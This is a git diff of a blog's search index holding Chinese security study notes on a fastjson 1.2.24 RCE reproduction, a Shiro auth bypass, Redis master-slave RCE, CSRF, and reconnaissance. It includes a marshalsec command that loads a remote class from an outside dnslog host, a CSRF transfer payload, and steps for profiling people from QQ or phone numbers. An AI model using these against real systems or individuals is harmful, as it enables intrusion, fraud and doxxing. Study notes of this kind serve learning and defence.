@@ -438,6 +438,66 @@
       </tags>
   </entry>
   <entry>
+    <title>fastjson-1.2.24-rce</title>
+    <url>/2021/09/16/fastjson-1-2-24-rce/</url>
+    <content><![CDATA[<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson-1.2.24-rce"></a>fastjson-1.2.24-rce</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>java处理JSON数据有三个比较流行的类库</p>
+<ul>
+<li>gson(google维护)</li>
+<li>jackson</li>
+<li>以及主角fastjson</li>
+</ul>
+<blockquote>
+<p>fastjson是阿里巴巴一个开源的json相关的java library</p>
+</blockquote>
+<p>fastjson简介</p>
+<blockquote>
+<p>Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上</p>
+<p>它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象</p>
+</blockquote>
+<h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>jkd1.8 + maven 3.3.9</p>
+<p>maven安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;</span><br><span class="line"># 解压</span><br><span class="line">tar -zxvf </span><br><span class="line"># 配置环境变量</span><br><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">添加</span><br><span class="line">export MAVEN_HOME&#x3D;&#x2F;xxx&#x2F;apache-maven-3.3.9 &#x2F;&#x2F;maven位置</span><br><span class="line">export PATH&#x3D;$&#123;PATH&#125;:$&#123;MAVEN_HOME&#125;&#x2F;bin</span><br><span class="line"># 更新配置</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/16/gVY59HIiWMf64s1.png" alt="image-20210916184550020"></p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://i.loli.net/2021/09/16/zpdBxQsut6OJlPg.png" alt="image-20210916182541274"></p>
+<p>流程</p>
+<ul>
+<li>编写恶意类，编译为class文件</li>
+<li>在class的目录用python开一个HTTP服务</li>
+<li>marshalsec起一个RMI服务</li>
+<li>构造包触发反序列化点远程加载恶意类</li>
+</ul>
+<blockquote>
+<p>marshalsec是一款快速开启RMI和LDAP服务神器，由maven编译</p>
+<p>RMI是远程方法调用，是一种实现远程过程调用的java api</p>
+</blockquote>
+<h4 id="python起一个http服务"><a href="#python起一个http服务" class="headerlink" title="python起一个http服务"></a>python起一个http服务</h4><p>监听在1111端口上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1111</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/16/9CrbzBYSgeioFpX.png" alt="image-20210916194907584"></p>
+<h4 id="marshalsec起一个RMI服务"><a href="#marshalsec起一个RMI服务" class="headerlink" title="marshalsec起一个RMI服务"></a>marshalsec起一个RMI服务</h4><p>监听9999端口并加载远程类dnslog.class</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line"># mvn编译 marshalsec项目</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/16/xh3gPHeXZBwDjEA.png" alt="image-20210916190611966"></p>
+<p>编译完成会出现<code>BUILD SUCCESS</code>，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件</p>
+<p><img src="https://i.loli.net/2021/09/16/6OFLAdjEXPINl9v.png" alt="image-20210916201555690"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;k2ccci.ceye.io:80&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/CoLo/p/14499041.html">Fastjson1.2.24RCE漏洞复现</a></p>
+<p><a href="https://www.freebuf.com/articles/web/242712.html">Fastjson1.2.24漏洞复现详细过程</a></p>
+]]></content>
+      <categories>
+        <category>fastjson</category>
+      </categories>
+      <tags>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>redis 4-unacc</title>
     <url>/2021/06/28/redis-4-unacc/</url>
     <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
@@ -500,23 +560,6 @@
       </tags>
   </entry>
   <entry>
-    <title>redis rce 4.x/5.x 基于主从复制</title>
-    <url>/2021/07/24/redis-rce-4-x-5-x-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="基于主从复制的rce"><a href="#基于主从复制的rce" class="headerlink" title="基于主从复制的rce"></a>基于主从复制的rce</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而<strong>从机只负责读，主机只负责写</strong>，通过<strong>读写分离</strong>可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
-<blockquote>
-<p>当数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式</p>
-</blockquote>
-<h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis在4.x以后新增了模块功能，通过外部扩展，可以实现在Redis中实现一个新的Redis命令，通过c并编译出<code>.so</code>文件</p>
-<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h2><p>Redis 4.x-Redis 5.x</p>
-<p><img src="https://i.loli.net/2021/07/26/kdjrNSR6bivB1fQ.png" alt="image-20210726101726937"></p>
-<p><img src="https://i.loli.net/2021/07/25/DItCREc985YXj7J.png" alt="image-20210725211335807"></p>
-<p><img src="https://i.loli.net/2021/07/25/pJVHLjYRSyM3h9T.png" alt="image-20210725222651716"></p>
-]]></content>
-      <tags>
-        <tag>Redis rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shiro 反序列化CVE-2016-4437</title>
     <url>/2021/09/09/shiro-CVE-2016-4437/</url>
     <content><![CDATA[<h2 id="shiro-反序列化-CVE-2016-4437"><a href="#shiro-反序列化-CVE-2016-4437" class="headerlink" title="shiro 反序列化 CVE-2016-4437"></a>shiro 反序列化 CVE-2016-4437</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache shiro框架提供了记住我（Remember me）功能，用户登录后会生成经过加密的cookie，cookie中的rememberMe字段会被分别进行序列化，AES加密，base64编码操作，</p>
@@ -558,37 +601,6 @@
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/loong-hon/p/10619616.html">Apache Shiro Java反序列化漏洞分析</a></p>
 <p><a href="https://www.cnblogs.com/renhaoblog/p/12971152.html">Apache Shiro 反序列化漏洞复现（CVE-2016-4437）</a></p>
 <p><a href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">Apache Shiro 反序列化漏洞实战</a></p>
-]]></content>
-      <categories>
-        <category>shiro</category>
-      </categories>
-      <tags>
-        <tag>shiro</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shiro权限绕过CVE-2020-1957</title>
-    <url>/2021/09/11/shiro-CVE-2020-1957/</url>
-    <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
-<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>shiro通过拦截器来实现对用户访问权限的控制和拦截，有anon,authc拦截器</p>
-<blockquote>
-<p>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br>authc为登录拦截器，需要登录认证才能访问的资源</p>
-</blockquote>
-<p>在shiro.ini编写匹配的url配置，将会拦截匹配的url，并执行响应的拦截器，实现对url的控制</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">&#x2F;index.html &#x3D; anon</span><br><span class="line">&#x2F;user&#x2F;** &#x3D; authc</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>如上，访问/index.html时anon拦截器不会进行登录判断，而访问/user/xxx等页面时，authc拦截器会进行登录判断</p>
-</blockquote>
-<p>url路径表达式通常为ant格式，路径通配符支持 <code>?</code>  <code>*</code> <code>**</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure>
-<p><code>/*</code>可以匹配到<code>/admin</code>，而匹配不到<code>/admin/</code>因为<code>*</code>不能匹配路径</p>
-<p>这是如果对/admin设置了authc拦截器，访问该页面会进行登录判断；当请求的/admin/时会因为<code>/*</code>无法正确路径，会放行进入spring(Servlet)拦截器，最终/admin和/admin/访问到的资源是一样的</p>
-<p>或者说是spring web匹配url的时候没有匹配上/导致绕过</p>
-<p>请求的URL在整个项目的传入传递过程中，在使用了shiro的项目，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)，漏洞就出现在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</p>
-<p><img src="https://i.loli.net/2021/09/11/Q7F6VoACpR1keaW.png" alt="image-20210911212501781"></p>
-<p><img src="https://i.loli.net/2021/09/12/Oc9XgtIHwu5efNp.png" alt="image-20210912171647697"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></p>
-<p><a href="https://paper.seebug.org/1196/">Shiro 权限绕过漏洞分析(CVE-2020-1957)</a></p>
 ]]></content>
       <categories>
         <category>shiro</category>
@@ -660,6 +672,55 @@
       </tags>
   </entry>
   <entry>
+    <title>shiro权限绕过CVE-2020-1957</title>
+    <url>/2021/09/11/shiro-CVE-2020-1957/</url>
+    <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
+<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>shiro通过拦截器来实现对用户访问权限的控制和拦截，有anon,authc拦截器</p>
+<blockquote>
+<p>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br>authc为登录拦截器，需要登录认证才能访问的资源</p>
+</blockquote>
+<p>在shiro.ini编写匹配的url配置，将会拦截匹配的url，并执行响应的拦截器，实现对url的控制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">&#x2F;index.html &#x3D; anon</span><br><span class="line">&#x2F;user&#x2F;** &#x3D; authc</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如上，访问/index.html时anon拦截器不会进行登录判断，而访问/user/xxx等页面时，authc拦截器会进行登录判断</p>
+</blockquote>
+<p>url路径表达式通常为ant格式，路径通配符支持 <code>?</code>  <code>*</code> <code>**</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure>
+<p><code>/*</code>可以匹配到<code>/admin</code>，而匹配不到<code>/admin/</code>因为<code>*</code>不能匹配路径</p>
+<p>这是如果对/admin设置了authc拦截器，访问该页面会进行登录判断；当请求的/admin/时会因为<code>/*</code>无法正确路径，会放行进入spring(Servlet)拦截器，最终/admin和/admin/访问到的资源是一样的</p>
+<p>或者说是spring web匹配url的时候没有匹配上/导致绕过</p>
+<p>请求的URL在整个项目的传入传递过程中，在使用了shiro的项目，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)，漏洞就出现在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</p>
+<p><img src="https://i.loli.net/2021/09/11/Q7F6VoACpR1keaW.png" alt="image-20210911212501781"></p>
+<p><img src="https://i.loli.net/2021/09/12/Oc9XgtIHwu5efNp.png" alt="image-20210912171647697"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></p>
+<p><a href="https://paper.seebug.org/1196/">Shiro 权限绕过漏洞分析(CVE-2020-1957)</a></p>
+<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">CVE-2020-11989（玄武实验室）</a></p>
+]]></content>
+      <categories>
+        <category>shiro</category>
+      </categories>
+      <tags>
+        <tag>shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>redis rce 4.x/5.x 基于主从复制</title>
+    <url>/2021/07/24/redis-rce-4-x-5-x-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="基于主从复制的rce"><a href="#基于主从复制的rce" class="headerlink" title="基于主从复制的rce"></a>基于主从复制的rce</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而<strong>从机只负责读，主机只负责写</strong>，通过<strong>读写分离</strong>可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
+<blockquote>
+<p>当数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式</p>
+</blockquote>
+<h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis在4.x以后新增了模块功能，通过外部扩展，可以实现在Redis中实现一个新的Redis命令，通过c并编译出<code>.so</code>文件</p>
+<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h2><p>Redis 4.x-Redis 5.x</p>
+<p><img src="https://i.loli.net/2021/07/26/kdjrNSR6bivB1fQ.png" alt="image-20210726101726937"></p>
+<p><img src="https://i.loli.net/2021/07/25/DItCREc985YXj7J.png" alt="image-20210725211335807"></p>
+<p><img src="https://i.loli.net/2021/07/25/pJVHLjYRSyM3h9T.png" alt="image-20210725222651716"></p>
+]]></content>
+      <tags>
+        <tag>Redis rce</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tomcat8 弱口令</title>
     <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
@@ -688,6 +749,33 @@
       <tags>
         <tag>Tomcat</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>web基础学习</title>
+    <url>/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="web基础之信息收集"><a href="#web基础之信息收集" class="headerlink" title="web基础之信息收集"></a>web基础之信息收集</h1><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>whois查询和备案信息</p>
+<p>可能获取到的信息有：注册人、注册商、邮件、dns解析服务器、注册人电话、地址位置等等</p>
+<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>对该目标进行全方位、不同业务的认识</p>
+<p>了解其运行框架</p>
+<h3 id="真实ip、旁段、C段"><a href="#真实ip、旁段、C段" class="headerlink" title="真实ip、旁段、C段"></a>真实ip、旁段、C段</h3><p>端口信息：开放的端口和服务漏洞</p>
+<p>历史的解析域名和域名的历史解析ip</p>
+<h3 id="敏感信息、目录和文件"><a href="#敏感信息、目录和文件" class="headerlink" title="敏感信息、目录和文件"></a>敏感信息、目录和文件</h3><p>可能存在敏感信息泄露，获取到登陆点、后台、物理路径、waf信息、个人信息等等</p>
+<h3 id="社工信息"><a href="#社工信息" class="headerlink" title="社工信息"></a>社工信息</h3><p>查看注册的网站 reg007</p>
+<h4 id="知道qq号能怎么利用"><a href="#知道qq号能怎么利用" class="headerlink" title="知道qq号能怎么利用"></a>知道qq号能怎么利用</h4><ol>
+<li>查看个人信息、空间信息、说说日志留言，了解这个人大体的生活状态和地理位置</li>
+<li>加qq钓鱼、共同好友、可能认识的人</li>
+<li>通过qq邮箱和qq号搜索支付宝、淘宝等平台</li>
+<li>通过微信搜索</li>
+<li>搜索腾讯\新浪微博</li>
+</ol>
+<h4 id="知道手机号"><a href="#知道手机号" class="headerlink" title="知道手机号"></a>知道手机号</h4><ol>
+<li>搜索主流社交账号：qq、微信、微博、小红书等</li>
+<li>查询支付宝、qq交易，通过进行转账查看真实的姓氏</li>
+<li>根据qq空间或朋友圈照片进行百度识图</li>
+</ol>
+<h4 id="留意社交动态"><a href="#留意社交动态" class="headerlink" title="留意社交动态"></a>留意社交动态</h4><p>照片中暴露的信息，水印、地理位置等信息</p>
+<p>照片的exif可能会有GPS和手机类型，图片内容特征</p>
+]]></content>
   </entry>
   <entry>
     <title>tomcat-ajp文件包含漏洞</title>
@@ -757,33 +845,6 @@
       <tags>
         <tag>Tomcat</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>web基础学习</title>
-    <url>/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="web基础之信息收集"><a href="#web基础之信息收集" class="headerlink" title="web基础之信息收集"></a>web基础之信息收集</h1><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>whois查询和备案信息</p>
-<p>可能获取到的信息有：注册人、注册商、邮件、dns解析服务器、注册人电话、地址位置等等</p>
-<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>对该目标进行全方位、不同业务的认识</p>
-<p>了解其运行框架</p>
-<h3 id="真实ip、旁段、C段"><a href="#真实ip、旁段、C段" class="headerlink" title="真实ip、旁段、C段"></a>真实ip、旁段、C段</h3><p>端口信息：开放的端口和服务漏洞</p>
-<p>历史的解析域名和域名的历史解析ip</p>
-<h3 id="敏感信息、目录和文件"><a href="#敏感信息、目录和文件" class="headerlink" title="敏感信息、目录和文件"></a>敏感信息、目录和文件</h3><p>可能存在敏感信息泄露，获取到登陆点、后台、物理路径、waf信息、个人信息等等</p>
-<h3 id="社工信息"><a href="#社工信息" class="headerlink" title="社工信息"></a>社工信息</h3><p>查看注册的网站 reg007</p>
-<h4 id="知道qq号能怎么利用"><a href="#知道qq号能怎么利用" class="headerlink" title="知道qq号能怎么利用"></a>知道qq号能怎么利用</h4><ol>
-<li>查看个人信息、空间信息、说说日志留言，了解这个人大体的生活状态和地理位置</li>
-<li>加qq钓鱼、共同好友、可能认识的人</li>
-<li>通过qq邮箱和qq号搜索支付宝、淘宝等平台</li>
-<li>通过微信搜索</li>
-<li>搜索腾讯\新浪微博</li>
-</ol>
-<h4 id="知道手机号"><a href="#知道手机号" class="headerlink" title="知道手机号"></a>知道手机号</h4><ol>
-<li>搜索主流社交账号：qq、微信、微博、小红书等</li>
-<li>查询支付宝、qq交易，通过进行转账查看真实的姓氏</li>
-<li>根据qq空间或朋友圈照片进行百度识图</li>
-</ol>
-<h4 id="留意社交动态"><a href="#留意社交动态" class="headerlink" title="留意社交动态"></a>留意社交动态</h4><p>照片中暴露的信息，水印、地理位置等信息</p>
-<p>照片的exif可能会有GPS和手机类型，图片内容特征</p>
-]]></content>
   </entry>
   <entry>
     <title>内网环境搭建</title>
@@ -978,51 +1039,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>常见web漏洞学习之CSRF</title>
-    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
-    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
-<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
-<blockquote>
-<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
-</blockquote>
-<p>图里解释很清楚了，就不赘述了</p>
-<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
-<p>还是老生常谈的银行转账的问题</p>
-<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
-<p>而攻击者构造的代码是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
-<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
-<blockquote>
-<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
-</blockquote>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
-<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
-<li>验证http referer字段</li>
-</ol>
-<p>referer就是记录了请求的来源（同源策略）</p>
-<blockquote>
-<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
-</blockquote>
-<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
-<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
-<li>添加token并验证</li>
-</ol>
-<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
-<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
-<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
-]]></content>
-      <categories>
-        <category>csrf</category>
-      </categories>
-      <tags>
-        <tag>csrf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见web漏洞学习之RCE</title>
     <url>/2021/07/20/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BRCE/</url>
     <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>remote command/code execute</p>
@@ -1078,6 +1094,51 @@
       </categories>
       <tags>
         <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之CSRF</title>
+    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
+    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
+<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
+<blockquote>
+<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
+</blockquote>
+<p>图里解释很清楚了，就不赘述了</p>
+<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
+<p>还是老生常谈的银行转账的问题</p>
+<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>而攻击者构造的代码是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
+<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
+<blockquote>
+<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
+</blockquote>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
+<li>验证http referer字段</li>
+</ol>
+<p>referer就是记录了请求的来源（同源策略）</p>
+<blockquote>
